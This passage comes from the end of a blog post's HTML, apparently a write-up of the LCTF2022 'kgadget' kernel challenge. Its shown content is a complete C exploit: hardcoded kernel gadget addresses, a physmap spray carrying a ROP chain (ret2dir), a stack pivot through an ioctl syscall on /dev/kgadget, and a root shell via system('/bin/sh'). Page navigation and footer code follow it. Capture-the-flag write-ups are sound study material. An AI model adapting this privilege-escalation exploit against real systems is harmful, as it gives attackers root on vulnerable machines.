class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-7/" rel="prev" title="how2heap 深入学习(7)">
+      <i class="fa fa-chevron-left"></i> how2heap 深入学习(7)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/" rel="next" title="虎符CTF-2022 babygame 题解">
+      虎符CTF-2022 babygame 题解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dir"><span class="nav-number">1.</span> <span class="nav-text">ret2dir</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LCTF2022-kgadget"><span class="nav-number">1.1.</span> <span class="nav-text">LCTF2022-kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ioctl%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">ioctl函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#release%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">1.1.2.</span> <span class="nav-text">release函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-1-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">Step 1: 硬编码函数地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-2-%E7%94%B3%E8%AF%B7%E5%A4%A7%E7%A9%BA%E9%97%B4"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">Step 2: 申请大空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-3-%E5%A1%AB%E5%85%85%E7%A9%BA%E9%97%B4"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">Step 3: 填充空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-4-%E6%9E%84%E9%80%A0%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">Step 4: 构造栈迁移</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
